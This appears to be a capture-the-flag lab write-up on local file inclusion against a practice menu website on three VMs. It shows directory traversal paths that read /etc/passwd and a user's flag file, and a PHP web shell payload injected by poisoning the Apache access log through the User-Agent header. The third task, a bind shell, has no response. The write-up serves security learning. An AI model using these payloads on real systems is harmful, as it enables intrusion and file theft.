# LFI

## VM1

On target VM #1 you identified a page that has a new vulnerability. Can you use this vulnerability to determine the users of this system and then leak some sensitive information (_flag.txt_) from the home directory of one of these users?

### Response

Notice `http://<VM-IP>/menu` loads with a `?file=` parameter. Perhaps this can be leveraged.

Use nmap to validate which HTTP server is being used by the machine:

```
kali@kali:~$ sudo nmap -Pn -sV -O 192.168.137.52         
[sudo] password for qwerzxcv: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-22 17:31 MDT
Nmap scan report for 192.168.137.52
Host is up (0.072s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Ubuntu 5ubuntu1.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.51 ((Debian))
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=3/22%OT=22%CT=1%CU=37408%PV=Y%DS=2%DC=I%G=Y%TM=641B901
OS:1%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=FE%TI=Z%II=I%TS=A)SEQ(TI=Z%
OS:TS=A)OPS(O1=M551ST11NW7%O2=M551ST11NW7%O3=M551NNT11NW7%O4=M551ST11NW7%O5
OS:=M551ST11NW7%O6=M551ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=                                         
OS:FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M551NNSNW7%CC=Y%Q=)ECN(R=N)T1(R=Y%DF=Y%T                                         
OS:=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%T=40%W=0%S=Z%                                         
OS:A=S+%F=AR%O=%RD=0%Q=)T5(R=N)T6(R=N)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%                                         
OS:RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)U1(R=N)IE(R=Y%DFI=N%T=40%CD=S)IE(R=N)                                          
                                                                                                                    
Network Distance: 2 hops                                                                                            
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                                                             
                                                                                                                    
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .               
Nmap done: 1 IP address (1 host up) scanned in 40.31 seconds    
```

Validate that Apache is being used. Perhaps the access log files (at `/var/log/apache2/access.log`) can be poisoned.

Will attempt to submit `<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>` using netcat.

Validated that directory traversal is possible:

* Menu file is at `/var/www/html` and is referenced in the URL as `/menu.php?file=current_menu.php`
* Alternatively it is possible to access the menu with `/menu.php?file=../../www/html/current_menu.php`

Could not access Apache logs. After struggling for awhile realized I was overthinking. The question just needed the ability to leak info via LFI. Found I could access files such as `/etc/passwd` via `/menu.php?file=../../../etc/passwd` and from there found a list of users.

{% code title="/etc/passwd" overflow="wrap" %}
```
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin jessie:x:1000:1000::/home/jhl8:/bin/sh brittany:x:1001:1001::/home/bgn7:/bin/sh chris:x:1002:1002::/home/cde6:/bin/sh adriana:x:1003:1003::/home/aah1:/bin/sh 
```
{% endcode %}

Under Chris's home directory (`http://192.168.137.52/menu.php?file=../../../home/cde6/flag.txt`) the flag was found.

## VM2

This updated Taco Truck menu page suffers from the same File Inclusion vulnerability as the first menu website, but you no longer can use other files (like `/etc/passwd`) to determine the flag's file name. Instead, on VM #2 find and pollute the log file for this system to gain a web-based shell. Use that web shell to then list the files in the main web directory to both identify and read the flag.

### Response

This is basically what I was trying to do when I was overthinking VM1

Validated access logs exist (at `/var/log/apache2/access.log`) can be reached via `?file=` parameter. `/menu.php?file=../../../var/log/apache2/access.log`

Upon reviewing the logs I determined that it was logging the resource a user attempted to access and the User-Agent header. Used Burp to change the UA header in-transit to include the malicious PHP command. From there I could execute commands and used `ls` to find that there was a file titled `flag_3fFOVxQkYcBKTF5JyOQU5LLq` containing the flag.

## VM3

As the third and final step, you now need to get a full shell on the target VM #3 and, not just any full shell, but a fully interactive TTY shell on the new and improved Taco Trunk website. To make your life easier, this website already has a web shell at `/cmd.php`. This challenge exposes the internal **port 60000** (nothing is listening yet on this port) to enable the use of a bind shell instead of a reverse shell callback. Once you have a fully interactive tty shell, execute _flag_ from inside this shell to get the flag to this challenge.

### Response

